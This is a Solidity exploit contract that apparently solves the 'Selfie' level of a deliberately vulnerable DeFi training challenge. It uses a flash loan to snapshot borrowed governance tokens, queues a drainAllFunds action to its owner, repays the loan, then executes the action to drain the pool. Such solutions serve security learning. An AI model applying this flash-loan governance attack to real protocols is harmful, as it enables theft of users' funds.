// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

error SelfieSolver__NotOwner();

contract SelfieSolver {
    address private immutable i_owner;
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    uint256 actionId;

    modifier ownerOnly() {
        if (msg.sender != i_owner) {
            revert SelfieSolver__NotOwner();
        }
        _;
    }

    constructor(address poolAddress, address governanceAddress) {
        i_owner = msg.sender;
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function attack(uint256 borrowAmount) external ownerOnly {
        // 1) Get a flash loan
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        // 2) Take a snapshot
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(tokenAddress);
        token.snapshot();
        // 3) Use the snapshoted amount (from the loan) to propose an Action in the Governance
        bytes memory functionData = abi.encodeWithSignature("drainAllFunds(address)", i_owner);
        actionId = governance.queueAction(address(pool), functionData, 0);
        // 4) Pay back the loan
        token.transfer(address(pool), borrowAmount);
    }

    function executeToDrain() external ownerOnly {
        governance.executeAction(actionId);
    }
}
